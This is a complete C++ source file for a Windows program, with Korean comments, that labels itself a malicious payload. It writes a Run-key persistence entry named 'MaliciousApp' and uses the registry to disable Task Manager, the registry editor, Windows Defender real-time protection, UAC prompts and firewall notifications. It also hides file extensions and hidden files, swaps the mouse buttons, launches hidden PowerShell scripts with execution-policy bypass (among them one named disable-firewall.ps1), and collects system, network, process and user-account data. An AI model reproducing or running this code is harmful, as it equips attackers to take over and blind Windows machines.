#include <iostream>
#include <windows.h>
#include <Shlobj.h> // IsUserAnAdmin을 위해 필요
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <filesystem> // C++17 이상, 파일 경로 처리를 위해 필요
#include <array>
#include <stdexcept>

// 링커에게 필요한 라이브러리를 알려줍니다.
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

// 함수 선언
bool isAdmin();
void registryManipulation();
void powershellExecution();
void informationGathering();
std::string executeCommandAndCaptureOutput(const std::string& command);
std::wstring getExecutablePath();
std::wstring getExecutableDir();

/**
 * @brief 현재 스크립트가 관리자 권한으로 실행되었는지 확인합니다.
 * @return 관리자 권한이면 true, 아니면 false를 반환합니다.
 */
bool isAdmin() {
    return IsUserAnAdmin();
}

/**
 * @brief 10가지 레지스트리 항목을 생성하고 변조합니다.
 */
void registryManipulation() {
    if (!isAdmin()) {
        std::cout << "[-] 관리자 권한이 없어 레지스트리 조작을 건너뜁니다." << std::endl;
        return;
    }

    std::cout << "[+] 레지스트리 변조를 시작합니다..." << std::endl;

    HKEY hKey;
    LONG lRes;
    DWORD dwValue = 1;
    DWORD dwValueZero = 0;
    DWORD dwValueTwo = 2;

    try {
        // 1. 부팅 시 자동 실행 등록 (Persistence)
        std::wstring exePath = getExecutablePath();
        lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"MaliciousApp", 0, REG_SZ, (const BYTE*)exePath.c_str(), (exePath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            std::cout << "[+] 1/10: 시작프로그램 등록 완료." << std::endl;
        }

        // 2. 작업 관리자 비활성화 (Analysis Evasion)
        lRes = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
            RegCloseKey(hKey);
            std::cout << "[+] 2/10: 작업 관리자 비활성화 완료." << std::endl;
        }

        // 3. 레지스트리 편집기 비활성화 (Analysis Evasion)
        lRes = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
            RegCloseKey(hKey);
            std::cout << "[+] 3/10: 레지스트리 편집기 비활성화 완료." << std::endl;
        }
        
        // 4. 파일 확장자 숨기기 (User Deception)
        lRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_SET_VALUE, &hKey);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"HideFileExt", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
            // 5. 숨김 파일 및 폴더 안 보이게 강제 (Stealth) - 같은 키를 사용하므로 핸들을 닫지 않고 바로 사용
            RegSetValueExW(hKey, L"Hidden", 0, REG_DWORD, (const BYTE*)&dwValueTwo, sizeof(dwValueTwo));
            RegCloseKey(hKey);
            std::cout << "[+] 4/10: 파일 확장자 숨김 처리 완료." << std::endl;
            std::cout << "[+] 5/10: 숨김 파일/폴더 표시 기능 비활성화 완료." << std::endl;
        }

        // 6. Windows Defender 실시간 감시 무력화 (Defense Evasion) - HKLM은 관리자 권한 필수
        lRes = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
            RegCloseKey(hKey);
            std::cout << "[+] 6/10: Windows Defender 실시간 감시 비활성화 완료." << std::endl;
        }

        // 7. 바탕화면 변경 (Psychological Effect)
        std::wstring wallpaperPath = L"C:\\Windows\\System32\\setup.bmp";
        if(SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)) {
             std::cout << "[+] 7/10: 바탕화면 이미지 강제 변경 완료." << std::endl;
        }


        // 8. 마우스 좌우 버튼 바꾸기 (User Disruption)
        if(SwapMouseButton(TRUE)) {
             std::cout << "[+] 8/10: 마우스 좌우 버튼 기능 전환 완료." << std::endl;
        }

        // 9. UAC(사용자 계정 컨트롤) 프롬프트 비활성화 (Defense Evasion)
        lRes = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (const BYTE*)&dwValueZero, sizeof(dwValueZero));
            RegCloseKey(hKey);
            std::cout << "[+] 9/10: UAC 동의 프롬프트 비활성화 완료." << std::endl;
        }
        
        // 10. 방화벽 알림 기능 비활성화 (Defense Evasion)
        lRes = RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (lRes == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"DisableNotifications", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue));
            RegCloseKey(hKey);
            std::cout << "[+] 10/10: 방화벽 알림 비활성화 완료." << std::endl;
        }

    } catch (const std::exception& e) {
        std::cerr << "[-] 레지스트리 조작 중 오류 발생: " << e.what() << std::endl;
    }
}

/**
 * @brief 5가지 파워쉘 스크립트를 실행합니다.
 */
void powershellExecution() {
    std::cout << "[+] PowerShell 스크립트 실행을 시작합니다..." << std::endl;
    std::wstring scriptDir = getExecutableDir();
    std::vector<std::wstring> psScripts = {
        L"create-file.ps1", L"list-apps.ps1", L"list-services.ps1",
        L"get-network.ps1", L"disable-firewall.ps1"
    };

    for (const auto& script : psScripts) {
        std::filesystem::path scriptPath = scriptDir;
        scriptPath /= script;

        if (std::filesystem::exists(scriptPath)) {
            std::wstring command = L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + scriptPath.wstring() + L"\"";
            
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            
            // CreateProcess는 command line 인자를 수정할 수 있으므로, const가 아닌 버퍼를 전달해야 합니다.
            if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, INFINITE); // 스크립트 실행이 끝날 때까지 대기
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                std::wcout << L"[+] '" << script << L"' 실행 성공." << std::endl;
            } else {
                std::wcerr << L"[-] '" << script << L"' 실행 오류: " << GetLastError() << std::endl;
            }
        } else {
            std::wcerr << L"[-] 스크립트 파일을 찾을 수 없음: " << scriptPath.wstring() << std::endl;
        }
    }
}

/**
 * @brief cmd.exe를 사용하여 5가지 정보 수집 후 txt로 저장합니다.
 */
void informationGathering() {
    std::cout << "[+] 시스템 정보 수집을 시작합니다..." << std::endl;
    const std::string output_file = "system_info_report.txt";
    std::ofstream f(output_file, std::ios::out | std::ios::binary);

    std::vector<std::pair<std::string, std::string>> commands = {
        {"===== System Info =====", "systeminfo"},
        {"===== IP Config =====", "ipconfig /all"},
        {"===== Network Connections =====", "netstat -an"},
        {"===== Running Tasks =====", "tasklist /v"},
        {"===== User Accounts =====", "net user"}
    };

    for (const auto& pair : commands) {
        f << "\n" << pair.first << "\n\n";
        try {
            std::string result = executeCommandAndCaptureOutput(pair.second);
            f.write(result.c_str(), result.size());
        } catch (const std::runtime_error& e) {
            f << "Error executing command: " << pair.second << " -> " << e.what() << "\n";
        }
    }
    f.close();
    std::cout << "[+] 정보 수집 완료: " << output_file << std::endl;
}

int main() {
    // 콘솔 출력 인코딩을 시스템 기본값으로 설정 (한국어 Windows의 경우 CP949)
    setlocale(LC_ALL, "");

    if (isAdmin()) {
        std::cout << "### 악성 페이로드 실행 (관리자 모드) ###" << std::endl;
        registryManipulation();
        powershellExecution();
        informationGathering();
        std::cout << "\n### 모든 작업 완료. 10초 후 자동 종료됩니다. ###" << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(10));
    } else {
        std::cout << "이 프로그램은 관리자 권한이 필요합니다." << std::endl;
        std::cout << "Press Enter to exit..." << std::endl;
        std::cin.get();
    }

    return 0;
}

// --- Helper Functions ---

/**
 * @brief 현재 실행 파일의 전체 경로를 반환합니다.
 */
std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

/**
 * @brief 현재 실행 파일이 있는 디렉토리 경로를 반환합니다.
 */
std::wstring getExecutableDir() {
    std::wstring exePath = getExecutablePath();
    return std::filesystem::path(exePath).parent_path().wstring();
}

/**
 * @brief 주어진 명령어를 실행하고 그 표준 출력/에러를 문자열로 캡처하여 반환합니다.
 * @param command 실행할 명령어
 * @return 명령어 실행 결과 문자열
 */
std::string executeCommandAndCaptureOutput(const std::string& command) {
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // 파이프 생성
    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &sa, 0)) {
        throw std::runtime_error("StdoutRd CreatePipe failed");
    }
    // 자식 프로세스가 쓰기 핸들을 상속하도록 설정
    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
         throw std::runtime_error("Stdout SetHandleInformation failed");
    }

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFOA siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));

    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // cmd.exe를 통해 명령어 실행
    std::string cmd = "cmd.exe /C " + command;
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo)) {
        throw std::runtime_error("CreateProcess failed");
    }

    CloseHandle(hChildStd_OUT_Wr); // 자식 프로세스가 사용하므로 부모는 쓰기 핸들을 닫음

    std::string output;
    std::array<char, 128> buffer;
    DWORD dwRead;
    
    // 파이프에서 결과 읽기
    while (ReadFile(hChildStd_OUT_Rd, buffer.data(), buffer.size(), &dwRead, NULL) && dwRead != 0) {
        output.append(buffer.data(), dwRead);
    }
    
    CloseHandle(hChildStd_OUT_Rd);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    return output;
}